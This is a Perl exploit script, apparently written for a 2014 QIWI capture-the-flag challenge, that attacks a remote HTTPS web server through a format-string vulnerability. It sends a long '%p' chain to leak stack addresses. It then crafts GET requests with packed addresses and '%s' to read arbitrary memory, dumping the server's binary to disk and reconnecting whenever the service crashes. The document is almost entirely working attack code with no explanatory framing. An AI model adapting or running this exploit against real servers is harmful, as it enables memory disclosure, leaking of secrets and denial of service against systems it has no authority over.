#!/usr/bin/perl

use strict;
use IO::Socket::SSL;

$| = 1;
our $server_alive = 1;
my $sock;
my $write;
my $read;
my $payload_kill;
my $payload;
my $payload_read;
our $payload_memleak;
my $buf;
our @addrs;
my $offset;

$payload_memleak =
'GET ' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 

" HTTP/1.0\nConnection: Keep-Alive\n\n";

sub do_sock() {
	my $sock;
	our $server_alive;

	while (!defined($sock = IO::Socket::SSL->new("qiwictf2014.ru:8447"))) {
		print "[!] Can not create socket, may be banned! I'm going to sleep about 10 seconds\n";
		sleep 10;
	}

	print "[+] Create new socket!\n";
	$server_alive = 1;

	return $sock;
}

sub do_write() {
	my $sock = $_[0];
	my $mess = $_[1];

	my $ret;
	$ret = syswrite($sock, $mess);

	print "[+] Write payload to socket $ret bytes!\n";

	return $ret;
}

sub do_read() {
	my $sock = $_[0];
	my $read;
	my $buf;
	my $string;

	while ($read = sysread($sock, my $data, 1024) )
	{
		$buf .= $data;
		last if $buf =~ m/ not found :\(/mg;
	}

	if ($read == 0 && $buf eq "") {
		print "[!] Can not read from socket, may be socket is died!\n";
		$server_alive = 0;
		return undef;
	}

	if ($buf =~ m/^HTTP\/1\.1\s501\sNot\sImplemented/gim) {
		print "[!] While read socket return status 501\n";
		return -1;
	} elsif ($buf =~ m/^HTTP\/1\.1\s400\sBad\sRequest/gim) {
		print "[!] While read socket return status 400\n";
		return -1;
	}

	$buf =~ m/Page:\s(.+)\snot\sfound\s:\($/sm;

	if (!defined($1)) {
		print "[!] While read socket i can not find \"Page: ... not found :(\"\n";
		print $buf,"\n";
		return -1;
	}

	$string = $1;
	print "[+] Read " . length($string) . " bytes from payload in socket!\n";
	return $string;
}

sub do_memleak() {
	my $sock = $_[0];
	our $payload_memleak;
	our @addrs;

	print "[+] Doing memleak\n";

	$write = &do_write($sock, $payload_memleak);
	$buf = &do_read($sock);

	@addrs = split /0x/, $buf;

#	if ($addrs[2] == 70257025) {
#		print "[!] Something wrong with offset in \@addrs!\n";
#	}
}

sub do_payload_memread() {
	my $addr = $_[0];
	my $hexval;
	my $payload;

	$hexval = sprintf("%x", $addr);
	if ($hexval eq "" || length($hexval) <= 6) {
		print "[-] Wrong param for do_memread(): $addr\n";
		return -1;
	}

	$payload = "GET /AAA" . pack("I*", $addr) . '%x%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
#	print "[+] Generate read payload:" . . "\n";

	return $payload;
}

sub do_first_query() {
	my $sock = $_[0];
	my $read;
	my $write;

	$write = &do_write($sock, "GET /123 HTTP/1.0\n\n");
	$read = &do_read($sock);

	return 1;
}

sub do_restart() {
	my $sock = $_[0];

	my $write;
	my $read;
	my $payload;

	$payload = "GET /%s HTTP/1.0\n\n";

	$write = &do_write($sock, $payload);
	$read = &do_read($sock);

	return 1;
}

sub do_check_incorrect() {
	my $addr = $_[0];

	if (	(($addr & 0x0000ff00) == 0x2000)   ||
		(($addr & 0x0000ff00) == 0x0a00)   || 
		(($addr & 0x0000ff00) == 0x0000)   || 
		(($addr & 0x00ff0000) == 0x200000) ||
		(($addr & 0x00ff0000) == 0x0a0000) ||
		(($addr & 0x00ff0000) == 0x000000) )
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

sub do_memread() {
	my $sock = $_[0];
	my $addr = $_[1];

	my $payload;
	my $read;
	my $write;
	our $server_alive;

	my $hexval = sprintf("%x", $addr);

	$payload = &do_payload_memread($addr);
	if ($payload == -1) {
		return -2;
	}

	$write = &do_write($sock,$payload);
	$read = &do_read($sock);

	return $read;
}

# create sock and do meamleak
$sock = &do_sock();
&do_first_query($sock);

$sock = &do_sock();
&do_memleak($sock);

my $val;
my $base;

for (0..$#addrs) {
#	print "$_ => $addrs[$_]","\n";
}

#exit 1;
#my $sub = 1228800;
#my $sub = 0x001ac000;
my $sub = 0x1;
for (my $i = 742; $i<=742; $i++) {

	sleep 1;
	$offset = hex(43000);

	my $addr = $addrs[$i];
	$addr =~ s/\(nil\)//g;
	print "\n[+] Trying $i => $addr\n";

	$val = hex($addr);

#	$check_base = $val & 0xfffff000;
#	$check_base = $val - 5;

	open BINARY, ">", "dump/file.bin";
	binmode(BINARY);
	while (1) {
		my $buf;

		$base = (hex($addrs[$i]) & 0xfffff000) - 0x2c000;

		$val = $base + $offset;

		if ($addr eq "" || length($addr) <= 6) {
			print "[-] Wrong param for do_memread(): $addr\n";
			last;
		}

		if (($val & 0x000000ff) == 0x0a || ($val & 0x000000ff) == 0x00 || ($val & 0x000000ff) == 0x20) {
			open FILE, ">>dump/bad_bytes.txt";
			print FILE "" . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . "\n";
			close FILE;

			syswrite BINARY, "\xff";

			my $file = sprintf("%08X", $offset);
			open DATA, ">dump/chunked/$file";
			syswrite DATA, "ff";
			close DATA;

			$offset += 1;
			$val += 1;
		}

		if ( &do_check_incorrect($val)) {
			print "[!] Bad address: " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . ", restarting server\n";
			&do_restart($sock);
			sleep 1;

			$sock = &do_sock();
			&do_first_query($sock);

			$sock = &do_sock();
			&do_memleak($sock);

			next;
		}

		print "[+] Read memory: " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . "\n"; 
		$buf = &do_memread($sock, $val);
		if ($server_alive == 0 && !defined($buf)) {
			print "[-] Somebody kill server: " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) .  "\n\n";

			sleep 1;
			$sock = &do_sock();
			&do_first_query($sock);

			$sock = &do_sock();
			&do_memleak($sock);

			next;
		} elsif ($buf == -1) {
			print "[!!!!!!!!!!!!!!!!!!!!!!!!!!]\n";
			print "[-] Didn't can reading memory: " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . "\n\n";

			open FILE, ">>dump/bad_bytes.txt";
			print FILE "" . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . "\n";
			close FILE;

			syswrite BINARY,"\xff";

			my $file = sprintf("%08X", $offset);
			open DATA, ">dump/chunked/$file";
			syswrite DATA, "ff";
			close DATA;

			$offset += $sub;
			$sock = &do_sock();
			next;
		} elsif ($buf == -2) {
			print "[-] Not correct address\n";
			last;
		}


		$buf =~ m/^\/AAA(.{4})/sm;
		if (defined($1) || $1 ne "") {
			my $retaddr = hex(unpack("H*", reverse($1)));
			if ($retaddr != $val) {
				print "[!] Format string in reading address: " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . ", restarting\n\n";
				&do_restart($sock);
				sleep 1;

				$sock = &do_sock();
				&do_first_query($sock);

				$sock = &do_sock();
				&do_memleak($sock);

				next;
			}
		}
		else
		{
			print "[!] Not found packed address: " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . "\n";
		}

		"a" =~ /a/;

		$buf =~ m/\/\/\/(.+)/sm;

		my $string = $1;
		if (!defined($1) || $1 eq "" )
		{
			print "[+] Got data:    " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . ": 00\n\n";
			syswrite BINARY,"\x00";

			my $file = sprintf("%08X", $offset);
			open DATA, ">dump/chunked/$file";
			syswrite DATA, "00";
			close DATA;
		}
		else
		{
			my $hexstr = unpack("H*", $string);

			syswrite BINARY, $string . "\x00";

			print "[+] Got data:    " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . ": ${hexstr}00" . "\n\n";

			my $file = sprintf("%08X", $offset);
			open DATA, ">dump/chunked/$file";
			syswrite DATA, $hexstr."00";
			close DATA;

			$offset += length($hexstr)/2;
		}
		undef($string);

		"a" =~ /a/;
		$offset += $sub;
	}

}

__END__

# Цикл пробегается по указанным адресам и дампит их
for (my $i = 877; $i<=908; $i++) {

	sleep 2;

	my $addr = $addrs[$i];
	$addr =~ s/\(nil\)//g;
	print "\n[+] Trying $i => $addr\n";

	my $val = hex($addr);

	if (($val & 0x000000ff) == 0x0a || ($val & 0x000000ff) == 0x00) {
		$val++;
	}

	$payload = &do_payload_memread($val);
	if ($payload == -1) {
		next;
	}

	$write = &do_write($sock, $payload);
	$buf = &do_read($sock);
	if ($server_alive == 0 && !defined($buf)) {
		print "[-] Payload kill server: $i => $addr\n";

		open FILE, ">>stats7.txt";
		print FILE "[-] Payload kill server: $i => $addr\n";
		close FILE;

		sleep 1;
		$sock = &do_sock();
		&do_memleak($sock);
		next;
	}

	if ($buf == -1) {
		$sock = &do_sock();
		next;
	}
	print "[+] Got: " . unpack("H*", $buf) . "\n";

}
